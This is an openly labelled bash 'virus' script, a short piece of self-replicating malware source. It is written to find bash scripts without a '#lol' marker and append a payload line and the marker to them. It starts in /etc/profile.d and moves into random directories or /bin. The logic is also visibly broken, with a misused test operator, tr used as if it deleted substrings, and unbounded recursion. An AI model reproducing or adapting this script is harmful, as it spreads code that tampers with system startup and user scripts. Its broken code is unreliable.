#!/bin/bash

# Created by TheG0df2ther
# This is only an experiment but it can be dangerous.
# I am not responsible for the damage.

SHEBANG="#!/bin/bash"

FLAG="#lol"

# check if files are written in bash then  start infecting them.
# The virus ignores non bash scripts and already infected files

function check() {
 local IFBASH=$(grep -Fx "$SHEBANG" *)
 local LDIR=$(ls -d *)
 if [ "$IFBASH" =~ .*"$SHEBANG".* ]
 then
  local LISTNOTREADY=$(echo "$IFBASH" | tr -d ':#!/bin/bash')
  local LISTNOTREADYD=$(echo "$LISTNOTREADY" | sed -e 's/ /\ ,/g')
  local LISTNOTREADY2=$(grep -Fx "$FLAG" "$LISTNOTREADYD")
  local LISTNOTREADY2D=$(echo "$LISTNOTREADY2" | tr -d ':lol')
  LIST=$(echo "$LISTNOTREADY2D" | sed -e 's/ /\ ,/g')
  infect
 else
  if [ "$LDIR" == "" ]
  then
   cd /bin
   check
  else 
   CDDIR=$(shuf -n1 "$LDIR")
   cd "$CDDIR"
   check
  fi
 fi
}

# infect files

function infect() {
 echo "String you want to append to sh file" >> "$LIST"
 echo "$FLAG" >> "$LIST"
}

# start infecting autostart

cd /etc/profile.d/

check
